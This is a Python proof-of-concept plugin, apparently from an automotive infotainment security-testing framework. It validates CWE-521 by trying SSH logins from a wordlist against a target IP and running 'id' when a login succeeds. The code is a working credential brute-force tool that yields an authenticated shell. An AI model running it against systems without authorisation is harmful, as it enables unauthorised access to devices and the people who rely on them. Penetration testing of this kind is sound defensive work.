#!/usr/bin/env python3
"""
PoC Name: SSH Weak Credentials
Identifier: CWE-521
Component: Network Stack
Category: Network
Severity: High
CVSS: 8.0
Description: 车机SSH服务弱口令检测(12组常见默认密码)
Prerequisites: 目标SSH端口(22)开放, 需要paramiko库。
Usage: python3 04_CWE_521_SSH_Weak_Credentials_Active_Validation.py <target_ip>
"""
from __future__ import annotations

import socket
import sys
import time
import os
from iv_plugin_base import IVIVulnerabilityPlugin


def _resolve_credentials_path():
    candidates = []
    configured_dir = os.environ.get("AUTOSEC_POC_WORDLIST_DIR")
    if configured_dir:
        candidates.append(os.path.join(configured_dir, "credentials.txt"))
    candidates.extend([
        os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'pocs', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'wordlists', 'credentials.txt'),
    ])
    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            return candidate
    return candidates[0] if candidates else "credentials.txt"


VULN = {
    "id":             0,
    "cve":            "CWE-521",
    "year":           521,
    "domain":         "network",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "SSH Weak Creds",
    "source_url":     "https://cwe.mitre.org/data/definitions/521.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/521.html"],
    "signature_tokens": ["CWE-521"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-521 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-521") if vuln else "CWE-521",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class SSHWeakCredsPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-004"
    meta_poc_name = 'CWE-521 SSH 弱口令 Active Validation'
    meta_cve_id = "CWE-521"
    meta_source_url = "https://cwe.mitre.org/data/definitions/521.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/521.html']
    meta_severity = "High"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    meta_profiles         = ["network"]
    meta_requires_capabilities = ["service:ssh"]
    meta_grants_on_confirmed = ["access:ssh_authenticated", "capability:remote_shell"]
    requires_manual_review = True
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def exploit(self):
        port = 22
        self.logger.info(f"检测SSH弱口令 {self.target_ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("SSH端口22关闭")
                self.results["vulnerable"] = False
                s.close()
                return self.results
            s.close()
        except:
            self.results["vulnerable"] = False
            return self.results

        # 2. 加载字典
        wordlist_path = _resolve_credentials_path()
        if not os.path.exists(wordlist_path):
            self.logger.error("未找到字典文件 credentials.txt")
            return self.results

        try:
            import paramiko
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                credentials = [line.strip().split(':', 1) for line in f if ':' in line]
                
            self.logger.info(f"加载了 {len(credentials)} 组凭据，开始测试...")
            
            start_scan_time = time.time()
            consecutive_errors = 0
            for user, passwd in credentials:
                # 检查时长是否超过2分钟
                if time.time() - start_scan_time > 120:
                    self.logger.warning("SSH字典测试超时 (2分钟限制), 自动终止。")
                    break

                client = None
                try:
                    client = paramiko.SSHClient()
                    client.load_system_host_keys()
                    client.set_missing_host_key_policy(paramiko.RejectPolicy())
                    
                    # 尝试连接
                    client.connect(self.target_ip, port=port, username=user, 
                                 password=passwd, timeout=3, banner_timeout=5)
                    
                    # 登录成功
                    self.logger.warning(f"[+] 发现SSH弱口令: {user} / {passwd}")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = (
                        f"SSH login successful with {user}:{passwd}; "
                        "proof-of-access obtained via authenticated session and id command"
                    )
                    
                    # 验证权限
                    _, stdout, _ = client.exec_command("id")
                    self.logger.info(f"    权限信息: {stdout.read().decode().strip()}")
                    
                    client.close()
                    return self.results
                    
                except paramiko.AuthenticationException:
                    # 密码错误，重置错误项，继续下一个
                    consecutive_errors = 0
                    if client: client.close()
                    continue
                except (ConnectionRefusedError, socket.gaierror):
                    # 明确的拒绝连接或地址错误，直接中断
                    self.logger.error(f"连接被拒绝或主机不可达，中断扫描。")
                    if client: client.close()
                    break
                except (paramiko.SSHException, ConnectionError, socket.error) as e:
                    # 连接重置、超时、Banner错误等，记录并累计错误
                    consecutive_errors += 1
                    self.logger.debug(f"测试 {user}:{passwd} 遇到连接问题 ({consecutive_errors}/3): {str(e)[:50]}")
                    if client: client.close()
                    
                    if consecutive_errors >= 3:
                        self.logger.error("连续 3 次连接异常，可能触发了服务保护或服务已下线，中断测试。")
                        break
                        
                    # 遇到连接类错误，稍作休眠
                    time.sleep(1)
                    continue
                except Exception as e:
                    self.logger.error(f"测试 {user}:{passwd} 发生非预期异常: {e}")
                    if client: client.close()
                    break # 非预期异常，安全起见中断
                    
        except ImportError:
            self.logger.error("缺少 paramiko 库")
        except Exception as e:
            self.logger.error(f"扫描执行异常: {e}")

        self.logger.info("测试结束，未发现弱口令。")
        self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 04_CWE_521_SSH_Weak_Credentials_Active_Validation.py <target_ip>")
        sys.exit(1)
    plugin = SSHWeakCredsPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
